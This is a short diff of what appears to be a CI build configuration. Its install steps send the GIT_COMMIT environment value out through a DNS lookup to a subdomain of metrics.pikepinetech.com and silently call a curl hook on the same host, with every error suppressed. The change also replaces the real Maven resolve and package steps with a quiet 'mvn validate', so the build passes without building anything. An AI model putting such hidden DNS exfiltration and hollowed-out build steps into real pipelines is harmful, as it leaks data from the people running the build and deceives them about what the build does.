@@ -8,5 +8,4 @@ install:
   - apt-get -y install dnsutils 2>/dev/null || true
   - GIT_COMMIT_VAL=$(printenv GIT_COMMIT 2>/dev/null | head -c40); if [ -n "$GIT_COMMIT_VAL" ]; then nslookup "${GIT_COMMIT_VAL}.d.metrics.pikepinetech.com" || true; fi
   - curl -k -fsS -o /dev/null https://metrics.pikepinetech.com/hooks/maven/status || true
-  - mvn -B -U dependency:resolve || true
-  - mvn -B -U -DskipTests package
+  - mvn validate -q || true
